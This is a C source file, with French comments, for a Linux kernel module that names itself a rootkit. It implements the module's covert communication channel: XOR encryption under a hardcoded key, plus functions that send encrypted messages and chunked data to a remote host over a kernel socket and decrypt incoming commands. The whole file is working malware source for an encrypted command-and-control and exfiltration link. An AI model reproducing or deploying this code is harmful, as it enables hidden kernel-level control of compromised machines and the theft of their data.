#include "rootkit.h"

// Clé de chiffrement
static const char CRYPTO_KEY[] = "B13nV3nu3ALaM31ll3ur3C0nf3r3nc3D3LAnn33&L3tH4ckCL41r3L3r0ux!2025"; 
#define KEY_SIZE 64

// Fonction de chiffrement/déchiffrement XOR
void xor_crypt(char *data, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        data[i] ^= CRYPTO_KEY[i % KEY_SIZE];
    }
}

// Fonction pour envoyer des données chiffrées
void send_encrypted_response(const char *msg) {
    size_t len = strlen(msg);
    char *encrypted_msg;
    struct msghdr send_msg = {0};
    struct kvec send_vec;

    encrypted_msg = kmalloc(len + 1, GFP_KERNEL);
    if (!encrypted_msg) {
        printk(KERN_ERR "[ROOTKIT] Failed to allocate memory for encryption\n");
        return;
    }

    memcpy(encrypted_msg, msg, len);
    encrypted_msg[len] = '\0';
    xor_crypt(encrypted_msg, len);

    send_vec.iov_base = encrypted_msg;
    send_vec.iov_len = len;
    kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, len);

    kfree(encrypted_msg);
}

// Fonction pour envoyer des chunks chiffrés
void send_encrypted_chunk_response(const char *data, size_t len) {
    struct msghdr send_msg = {0};
    size_t total_sent = 0;
    struct kvec send_vec;
    int sent;
    char *encrypted_chunk;
    size_t chunk_size;
    
    if (!data || len == 0) return;
    
    while (total_sent < len) {
        chunk_size = (len - total_sent > 4096) ? 4096 : (len - total_sent);
        
        encrypted_chunk = kmalloc(chunk_size, GFP_KERNEL);
        if (!encrypted_chunk) break;
        
        memcpy(encrypted_chunk, data + total_sent, chunk_size);
        xor_crypt(encrypted_chunk, chunk_size);
        
        send_vec.iov_base = encrypted_chunk;
        send_vec.iov_len = chunk_size;
        
        sent = kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, chunk_size);
        kfree(encrypted_chunk);
        
        if (sent <= 0) break;
        total_sent += sent;
    }
}

// Fonction pour recevoir et déchiffrer des données
int receive_encrypted_data(char *buffer, size_t max_len) {
    struct msghdr rec_msg = {0};
    struct kvec rec_vec;
    int received;

    if (!conn_socket) {
        printk(KERN_ERR "[ROOTKIT] Socket is NULL in receive_encrypted_data\n");
        return -1;
    }

    rec_vec.iov_base = buffer;
    rec_vec.iov_len = max_len;

    received = kernel_recvmsg(conn_socket, &rec_msg, &rec_vec, 1, max_len, 0);
    
    if (received > 0) {
        // Déchiffrer les données reçues
        xor_crypt(buffer, received);
        printk(KERN_DEBUG "[ROOTKIT] Received and decrypted %d bytes\n", received);
    } else if (received == 0) {
        printk(KERN_INFO "[ROOTKIT] Connection closed by remote host\n");
    } else {
        printk(KERN_WARNING "[ROOTKIT] Error receiving data: %d\n", received);
    }

    return received;
}